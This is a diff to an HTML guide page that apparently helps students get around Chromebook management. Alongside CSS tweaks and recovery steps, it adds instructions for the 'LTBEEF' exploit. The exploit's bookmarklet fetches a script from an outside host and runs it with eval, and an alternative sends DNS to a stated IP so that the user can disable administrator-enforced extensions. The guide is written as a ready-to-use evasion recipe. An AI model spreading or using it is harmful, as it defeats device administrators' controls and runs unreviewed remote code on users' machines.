@@ -48,6 +48,20 @@
 			padding: 2px 4px;
 			border-radius: 4px;
 			font-family: monospace;
+			display: inline-block;
+		}
+
+		pre code {
+			display: block;
+			padding: 10px;
+			overflow-x: auto;
+		}
+
+		.author-info {
+			font-style: italic;
+			color: #555;
+			font-size: 0.95em;
+			margin-bottom: 4px;
 		}
 	</style>
 </head>
@@ -80,7 +94,7 @@
 		<li>Navigate to <a href="https://chrome100.dev" target="_blank">chrome100.dev</a>, press <kbd>Ctrl</kbd> +
 			<kbd>F</kbd> and type in your board.</li>
 		<li>Find and download the chrome version you want to your personal computer.</li>
-		<li>Install the <a href="https://chromewebstore.google.com/detail/chromebook-recovery-utili/pocpnlppkickgojjlmhdmidojbmbodfm?hl=en&pli=1" target="_blank">Chromebook Recovery Utility</a> onto your personal
+		<li>Install the <a href="https://chromewebstore.google.com/detail/chromebook-recovery-utili/pocpnlppkickgojjlmhdmidojbmbodfm?hl=en" target="_blank">Chromebook Recovery Utility</a> onto your personal
 			computer.</li>
 		<li>Open the extension, and click on the settings button in the top right hand corner, click "use local image".
 		</li>
@@ -89,6 +103,43 @@
 		<li>On your chromebook, press <kbd>Esc</kbd> + <kbd>Reload</kbd> + <kbd>Power</kbd> and follow the prompts.</li>
 		<li>On the checking for updates screen, press <kbd>Ctrl</kbd> + <kbd>Shift</kbd> + <kbd>E</kbd> to skip the
 			"checking for updates" screen.</li>
+	</ol>
+
+	<hr>
+
+	<h2>2. LTBEEF</h2>
+	<div class="author-info">Discovered by Bypassi#7037</div>
+	<div class="author-info">DNS servers hosted by The Greatest Giant#0110</div>
+	<p><strong>Notice:</strong> This exploit has been patched in later versions of 102, and 106+. LTBEEF is an exploit
+		which abuses API endpoints within the Google Chrome Web Store.</p>
+
+	<p>There are several versions of this exploit you can use. Here are the 2 most common options:</p>
+
+	<h3>A. BOOKMARKLETS</h3>
+	<ol>
+		<li>
+			Bookmark the script below:
+			<pre><code>fetch('https://compactcow.com/ltbeef/exploit.js').then(data=>{data.text().then(text=>{eval(text)})});</code></pre>
+			<em style="color: #ca3c3c; font-size: 0.9em;"
+		</li>
+		<li>Navigate to <a href="https://chrome.google.com/webstorex" target="_blank">chrome.google.com/webstorex</a>
+			and click on that bookmark.</li>
+		<li>Flip the switches on the extensions you want to disable. Simple!</li>
+	</ol>
+
+	<h3>B. DNS SERVERS</h3>
+	<p>By changing your DNS server, you can use LTBEEF even if bookmarklets are blocked entirely by management policies.
+	</p>
+	<ol>
+		<li>
+			Go to <strong>Settings &gt; Network &gt; Wi-Fi &gt; Network</strong>, and click on "Custom Name Servers".
+			<br>
+			<img src="https://user-images.githubusercontent.com/88395302/212482302-82334f42-c421-45c2-b210-1e700652b5be.png" alt="DNS Settings screen configuration" style="max-width: 100%; height: auto; margin-top: 10px; border-radius: 4px; box-shadow: 0 2px 5px rgba(0,0,0,0.15);">
+        </li>
+		<li>Set every box inside that input section to the following IP: <code>158.101.114.159</code></li>
+		<li>Navigate to <a href="https://chrome.google.com/webstorex" target="_blank">chrome.google.com/webstorex</a>.
+		</li>
+		<li>Flip the switches on the extensions you want to disable.</li>
 	</ol>
 </body>
 
